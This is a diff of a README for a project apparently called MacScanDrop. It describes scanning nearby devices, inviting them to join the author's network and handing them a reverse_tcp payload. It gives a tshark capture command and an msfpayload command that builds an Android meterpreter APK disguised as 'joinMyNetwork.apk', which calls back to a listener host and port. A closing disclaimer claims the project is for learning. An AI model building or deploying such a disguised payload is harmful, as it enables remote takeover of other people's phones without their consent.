@@ -1,4 +1,4 @@
-# MacScanDrop
+MacScanDrop
 
 Idea
 The idea here is to scan for devices in range of my own network. Sending out a request to all devices in range to join. In return I want to provide them with a reverse_tcp payload.
@@ -27,4 +27,4 @@ tshark -i 2 -a [autostop] duration:300 -w [write] tshark-scan-collection.pcap
 msfpayload android/meterpreter/reverse_tcp LHOST=192.168.1.120 LPORT=4444 R > joinMyNetwork.apk
 
 
-# This project is for learning and knowledge share to which I do no advocate or take upon any responsibility for illegal actions and/or damage performed or caused by individuals who use this information for purposes which it is not intended to be used.
+This project is for learning and knowledge share to which I do no advocate or take upon any responsibility for illegal actions and/or damage performed or caused by individuals who use this information for purposes which it is not intended to be used.
